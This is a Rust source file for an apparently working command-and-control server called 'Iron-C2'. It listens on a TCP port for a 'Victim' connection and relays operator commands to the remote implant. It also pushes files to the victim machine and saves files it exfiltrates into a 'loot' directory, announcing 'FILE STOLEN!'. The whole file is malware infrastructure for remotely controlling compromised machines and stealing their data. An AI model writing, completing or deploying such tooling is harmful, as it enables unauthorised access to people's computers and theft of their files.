use tokio::net::TcpListener;
use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader, AsyncBufReadExt};
use std::io::{self, Write};
use std::fs;
use base64::{Engine as _, engine::general_purpose};

pub async fn start_server(port: u16) {
    println!("\n[📡] C2 Listener Started...");
    println!("    🎧 Waiting on port {}...\n", port);

    let listener = TcpListener::bind(format!("0.0.0.0:{}", port)).await.unwrap();
    let (mut socket, addr) = listener.accept().await.unwrap();
    println!("    ✅ Victim Connected from: {}\n", addr);
    println!("    💡 Tip: Type 'download <file>' to steal.");
    println!("    💡 Tip: Type 'upload <file>' to send a file.\n");

    let (reader, mut writer) = socket.split();
    let mut reader = BufReader::new(reader);
    let mut stdin = BufReader::new(tokio::io::stdin());
    let mut input_line = String::new();
    
    // 🔥 වෙනස්කම: මෙතන vec! තිබීම අනිවාර්යයි
    let mut response_buffer = vec![0u8; 10240000]; 

    loop {
        print!("Iron-C2> ");
        io::stdout().flush().unwrap();

        input_line.clear();
        stdin.read_line(&mut input_line).await.unwrap();
        let command = input_line.trim();

        if command == "exit" { break; }

        if command.starts_with("upload ") {
            let filename = command.strip_prefix("upload ").unwrap().trim();
            println!("    ⏳ Uploading {}...", filename);

            match fs::read(filename) {
                Ok(data) => {
                    let b64_data = general_purpose::STANDARD.encode(data);
                    let payload = format!("UPLOAD:{}:{}\n", filename, b64_data);
                    if writer.write_all(payload.as_bytes()).await.is_err() {
                        println!("❌ Connection lost during upload!");
                        break;
                    }
                    println!("    ✅ File sent to buffer!");
                }
                Err(_) => println!("❌ File not found on SERVER! Check path."),
            }
        } else {
            if writer.write_all(input_line.as_bytes()).await.is_err() {
                println!("❌ Connection lost!");
                break;
            }
        }

        match reader.read(&mut response_buffer).await {
            Ok(n) if n > 0 => {
                let response = String::from_utf8_lossy(&response_buffer[..n]);

                if response.starts_with("FILE:") {
                    let parts: Vec<&str> = response.splitn(3, ':').collect();
                    if parts.len() == 3 {
                        let filename = parts[1];
                        let b64_data = parts[2];
                        if let Ok(file_bytes) = general_purpose::STANDARD.decode(b64_data) {
                            fs::create_dir_all("loot").unwrap_or_default();
                            let save_path = format!("loot/{}", filename);
                            fs::write(&save_path, file_bytes).unwrap_or_default();
                            println!("\n    🔥 FILE STOLEN! Saved to: {}\n", save_path);
                        }
                    }
                } else {
                    println!("\n{}\n", response.trim());
                }
            }
            Ok(_) => break,
            Err(_) => break,
        }
    }
}